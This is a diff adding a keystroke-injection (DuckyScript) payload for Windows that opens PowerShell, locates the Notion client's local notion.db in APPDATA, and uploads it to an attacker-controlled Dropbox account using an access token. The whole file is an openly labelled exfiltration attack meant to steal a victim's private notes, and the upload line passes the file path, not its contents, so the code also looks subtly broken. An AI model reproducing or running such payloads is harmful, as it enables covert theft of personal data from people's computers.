@@ -1,0 +1,48 @@
+REM #########################################################################
+REM #                                                                       |
+REM # Title        : Exfiltrates the entire database of the Notion client   |
+REM # Author       : Aleff                                                  |
+REM # Version      : 1.0                                                    |
+REM # Category     : Exfiltration                                           |
+REM # Target       : Windows 10-11                                          |
+REM #                                                                       |
+REM #########################################################################
+
+
+REM Requirements:
+REM     - Notion must be installed
+REM     - Internet Connection
+
+
+REM You must define your Dropbox accessToken or modify the exfiltration modality.
+DEFINE #DROPBOX_ACCESS_TOKEN example
+
+GUI r
+DELAY 1000
+STRING PowerShell
+ENTER
+DELAY 2000
+
+REM Settings about Notion DB
+STRINGLN
+    $NotionPath = Join-Path -Path $env:APPDATA -ChildPath 'Notion' 
+    $NotionDatabasePath = Join-Path -Path $NotionPath -ChildPath "notion.db"
+END_STRINGLN
+
+REM Setting about exfiltration
+STRINGLN $accessToken = "#DROPBOX_ACCESS_TOKEN"
+
+STRINGLN
+    $authHeader = @{Authorization = "Bearer $accessToken"}
+
+    $uploadUrl = "https://content.dropboxapi.com/2/files/upload"
+
+    $dropboxFilePath = "/notion.db"
+
+    $headers = @{}
+    $headers.Add("Authorization", "Bearer $accessToken")
+    $headers.Add("Dropbox-API-Arg", '{"path":"' + $dropboxFilePath + '","mode":"add","autorename":true,"mute":false}')
+    $headers.Add("Content-Type", "application/octet-stream")
+
+    Invoke-RestMethod -Uri $uploadUrl -Headers $headers -Method Post -Body $NotionDatabasePath; exit;
+END_STRINGLN
